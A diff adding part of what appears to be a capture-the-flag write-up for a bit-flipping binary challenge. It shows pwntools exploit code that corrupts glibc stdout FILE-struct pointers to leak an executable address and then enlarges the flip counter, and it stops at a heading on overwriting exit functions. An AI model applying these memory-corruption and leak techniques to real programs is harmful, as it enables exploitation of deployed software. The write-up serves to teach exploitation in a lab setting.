@@ -37,5 +37,59 @@ but the file write function called from puts will treat the stream as buffered a
 
 To force flush the buffer with its contents:
 
+- Ensure the _IO_CURRENTLY_PUTTING flag is set
 - We need to set stdout->read_end = stdout->write_base
 - Ensure stdout->write_ptr = stdout->write_end
+
+So we will need to:
+
+- Give an invalid index to make the program call puts with error message
+- Change stdout->read_end and stdout->write_base to a location right before our leak location
+
+```py
+# _IO_write_base
+sla(b"a: ", str(write_base+1))
+sla(b"b: ", "5")
+
+# _IO_read_end
+sla(b"a: ", str(read_end+1))
+sla(b"b: ", "5")
+```
+
+![image](https://github.com/user-attachments/assets/6829df7e-2dac-49aa-a274-27bc3c8d18ba)
+
+After running the script above, we can see now in our IO File struct, our target is located between write_base and write_ptr.
+
+```py
+sla(b"a: ", "9")
+sla(b"b: ", "9")
+
+data = p.recvuntil(b"we're flipping bits, not burgers", timeout=1)
+if len(data) < 100:
+  print("failed")
+  exit(1)
+
+diff = 0x7f0c55badf4a - 0x00007f0c55bad723
+elf_leak = u64(data[diff-2:diff+6])
+exe.address = elf_leak - (0x55ff52d83020 - 0x55ff52d7f000)
+li(f"exe addr @ {hex(exe.address)}")
+```
+
+![image](https://github.com/user-attachments/assets/ea0f0745-5cdb-45e4-a98e-669f0feeaecf)
+
+We can find the offset of our leak by subtracting the leak location with the write_base.
+
+```py
+print(len(str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"])))
+print(hex(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))
+
+## Make flip to big number
+sla(b"a: ", str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))
+sla(b"b: ", "7")
+```
+
+![image](https://github.com/user-attachments/assets/e0cd6a25-0461-4bc3-902a-4b2cfc4ae30c)
+
+Now we have a lot more bit flips.
+
+### Overwrite exit funcs
